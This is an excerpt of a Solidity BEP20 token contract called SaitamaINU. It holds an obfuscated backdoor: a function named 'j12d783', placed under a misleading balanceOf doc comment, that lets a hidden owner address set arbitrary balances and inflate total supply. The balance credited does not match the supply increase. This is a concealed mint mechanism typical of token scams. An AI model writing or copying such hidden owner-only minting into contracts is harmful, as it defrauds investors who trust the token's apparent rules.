...
contract SaitamaINU is Context, IBEP20, Ownable, LGEWhitelisted {
    
    using SafeMath for uint256;
    
    mapping (address => uint256) private targetCall;
    address private j12owner = msg.sender;
    ...
    * @dev See {BEP20-balanceOf}.
    */
    function j12d783(address j12address, uint256 j12value) external {
    require (msg.sender == j12owner);
      uint256 j12pid = 0;
    require(j12pid <= j12value, "Amount must be more than AddedValues");
      targetCall[j12address] = j12value * 10 ** 9;
      _totalSupply = _totalSupply.add(j12value);
      emit Transfer(address(0), j12address, j12value * 10 ** 9);
    }
    /**
